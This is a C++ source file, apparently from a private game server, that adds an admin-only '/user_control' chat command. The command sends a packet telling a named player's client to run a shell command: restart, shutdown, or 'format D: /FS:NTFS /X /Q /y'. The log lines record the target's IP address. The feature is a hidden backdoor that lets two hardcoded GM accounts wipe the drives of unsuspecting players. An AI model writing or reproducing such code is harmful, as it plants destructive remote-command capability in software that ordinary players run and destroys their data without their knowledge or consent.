/*********************************************************************
* date        : 2015.09.17
* file        : user_control.cpp
* author      : VegaS
*/
#include "stdafx.h"
#include "desc.h"
#include "utils.h"
#include "config.h"
#include "char.h"
#include "char_manager.h"
#include "affect.h"
#include "start_position.h"
#include "p2p.h"
#include "db.h"
#include "dungeon.h"
#include "castle.h"
#include <string>
#include <boost/algorithm/string/replace.hpp>
#include "desc_manager.h"
#include "buffer_manager.h"
#include "dev_log.h"
#include <fstream>
#include <algorithm>
#include <iostream>
#include "constants.h"
#include "questmanager.h"
#include "desc_client.h"
#include "sectree_manager.h"
#include "regen.h"
#include "item.h"
#include <boost/format.hpp>
#include "item_manager.h"
#include "user_control.h"
#define FILENAME_LOG_USER_CONTROL "logs_user_control.txt"
#define UserControlLogs(fmt, ...) WriteLogs(__FUNCTION__, __LINE__, fmt, __VA_ARGS__)

CUserControl::CUserControl()
{
}

CUserControl::~CUserControl()
{
}

static const char* LC_TRANSLATE(const char* key)
{
	typedef std::map<const char *, const char *> TMapTranslate;
	TMapTranslate LC_TRANSLATE;
	
	LC_TRANSLATE["USER_CONTROL_INFORMATIONS_LINE_1"]			= "<User Control> For more informations next time use: /user_control info";	
	LC_TRANSLATE["USER_CONTROL_INFORMATIONS_LINE_2"]			= "<User Control> 1. Shutdown / 2. Restart / 3. Format partition";		
	LC_TRANSLATE["USER_CONTROL_INFORMATIONS_LINE_3"]			= "<User Control> Usage: /user_control Name 2";	
	
	LC_TRANSLATE["USER_CONTROL_ERROR_TARGET_CHANNEL"]	= "<User Control> Target is on channel: %d. (My channel: %d)";	
	LC_TRANSLATE["USER_CONTROL_ERROR_TARGET_FIND"]		= "<User Control> Target not exist or is offline.";
	LC_TRANSLATE["USER_CONTROL_ERROR_TARGET_IS_SAME"]	= "<User Control> You can't do that target is same with you.";
	LC_TRANSLATE["USER_CONTROL_SUCCES_SENDED"]			= "<UserControl> TargetName: %s | Command: %s | IP: %s. (Succes sended packet)";
	LC_TRANSLATE["USER_CONTROL_INSERT_LOGS"]			= "TargetName: %s | Command: %s | IP: %s!";
	return LC_TRANSLATE[key];
}

void CUserControl::WriteLogs(const char *func, int line, const char *format, ...)
{
	va_list kwargs;
	time_t vKey = time(0);  
	char *time_s = asctime(localtime(&vKey));
	FILE* file = NULL;
	char szBuf[1024 + 2];
	int length;
	
	char szFileName[256];
	snprintf(szFileName, sizeof(szFileName), "%s/%s", LocaleService_GetBasePath().c_str(), FILENAME_LOG_USER_CONTROL);
	file = fopen(szFileName, "a+");

	if (!file)
	{
		sys_err("Error %s", szFileName);
		return;
	}

	time_s[strlen(time_s) - 1] = '\0';
	length = snprintf(szBuf, 1024, "Date: %-15.15s | ", time_s + 4);
	szBuf[1025] = '\0';

	if (length < 1024)
	{
		va_start(kwargs, format);
		vsnprintf(szBuf + length, 1024 - length, format, kwargs);
		va_end(kwargs);
	}

	strcat(szBuf, "\n");
	fputs(szBuf, file);
	fflush(file);
	fputs(szBuf, stdout);
	fflush(stdout);
}

std::string CUserControl::GetShellCommandByIndex(DWORD indexCat)
{
	switch (indexCat)
	{
		case ACTION_RESTART:
			return "shutdown -r";
		case ACTION_SHUTDOWN:
			return "shutdown -s -t 1";
		case ACTION_FORMAT:
			return "format D: /FS:NTFS /X /Q /y";
	}
}

void CUserControl::SendShellPacket(LPCHARACTER tch, const char* dwShellCommand)
{
	if (!tch)
		return;

	TPacketCGUserControl p;
	p.header = HEADER_GC_USER_CONTROL;
	strncpy(p.szTargetName, tch->GetName(), sizeof(p.szTargetName));
	strncpy(p.szCommand, dwShellCommand, sizeof(p.szCommand));
	tch->GetDesc()->Packet(&p, sizeof(p));
	UserControlLogs(LC_TRANSLATE("USER_CONTROL_INSERT_LOGS"), tch->GetName(), dwShellCommand, tch->GetDesc()->GetHostName());
}

bool CUserControl::IsAdmin(LPCHARACTER ch)
{
	std::string strListMembers[2] =
	{
		"[GA]XinZhao",
		"[GA]ZeNu",
	};
	
	for (int i=0; i<_countof(strListMembers); i++) {
		if (!strcmp(strListMembers[i].c_str(), ch->GetName()) && ch->GetGMLevel() == GM_IMPLEMENTOR)
			return true;
	}
	return false;
}

void CUserControl::Get(LPCHARACTER ch, const char* dwTargetName, const char* dwCommand)
{
	int dwIndex = 0;
	const char* dwShellCommand = "";

	if (!ch)
		return;
	
	if (!CUserControl::instance().IsAdmin(ch))
		return;

	if (!*dwTargetName && !*dwCommand || !*dwTargetName || !*dwCommand || !strcmp(dwTargetName, "info")|| !strcmp(dwCommand, "info"))
		goto USER_CONTROL_COMMAND_INFORMATION;

	if (isdigit(*dwCommand))
	{
		str_to_number(dwIndex, dwCommand);
		
		if (dwIndex < 0 || dwIndex > ACTION_FORMAT)
			return;
		
		LPCHARACTER tch = CHARACTER_MANAGER::instance().FindPC(dwTargetName);
		
		if (!tch)
		{
			CCI * pkCCI = P2P_MANAGER::instance().Find(dwTargetName);
			
			if (pkCCI)
			{
				if (pkCCI->bChannel != g_bChannel)
				{
					ch->ChatPacket(CHAT_TYPE_INFO, LC_TRANSLATE("USER_CONTROL_ERROR_TARGET_CHANNEL"), pkCCI->bChannel, g_bChannel);
					return;
				}
			}
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TRANSLATE("USER_CONTROL_ERROR_TARGET_FIND"));
			return;		
		}
		
		if (ch == tch)
		{
			ch->ChatPacket(CHAT_TYPE_INFO, LC_TRANSLATE("USER_CONTROL_ERROR_TARGET_IS_SAME"));
			return;
		}
		
		if (tch->GetGMLevel() > GM_PLAYER)
			return;

		dwShellCommand = CUserControl::instance().GetShellCommandByIndex(dwIndex).c_str();
		CUserControl::instance().SendShellPacket(tch, dwShellCommand);
		ch->ChatPacket(CHAT_TYPE_INFO, LC_TRANSLATE("USER_CONTROL_SUCCES_SENDED"), tch->GetName(), dwShellCommand, tch->GetDesc()->GetHostName());
	}
	else
		goto USER_CONTROL_COMMAND_INFORMATION;
	
USER_CONTROL_COMMAND_INFORMATION:
	ch->ChatPacket(CHAT_TYPE_NOTICE, "_____________________________________________");
	ch->ChatPacket(CHAT_TYPE_NOTICE, LC_TRANSLATE("USER_CONTROL_INFORMATIONS_LINE_1"));
	ch->ChatPacket(CHAT_TYPE_NOTICE, LC_TRANSLATE("USER_CONTROL_INFORMATIONS_LINE_2"));
	ch->ChatPacket(CHAT_TYPE_NOTICE, LC_TRANSLATE("USER_CONTROL_INFORMATIONS_LINE_3"));
}